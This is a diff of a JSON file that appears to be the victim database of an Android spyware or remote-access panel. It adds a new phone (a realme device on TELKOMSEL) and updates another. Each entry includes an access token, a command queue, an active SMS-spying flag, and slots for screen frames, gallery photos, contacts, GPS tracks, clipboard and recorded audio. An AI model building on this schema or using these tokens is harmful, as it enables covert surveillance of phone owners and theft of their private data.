@@ -5404,7 +5404,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777381267703,
+    "lastSeen": 1777381282602,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -13479,6 +13479,38 @@
       ],
       "receivedAt": 1777350760828
     },
+    "appList": null
+  },
+  {
+    "deviceId": "pxc_cd065a51",
+    "deviceName": "HP-SIPAGANESA-9F2F",
+    "ownerUsername": "ikiygasima",
+    "token": "7f17444d03b5a9a44ba6ab92faf2b179",
+    "lastSeen": 1777381283543,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-28T13:01:23.543Z",
+    "deviceInfo": {
+      "model": "realme RMX5303",
+      "androidVersion": "Android 15",
+      "battery": 37,
+      "network": "Seluler: TELKOMSEL",
+      "sim1": "TELKOMSEL",
+      "sim2": "TELKOMSEL"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
     "appList": null
   }
 ]
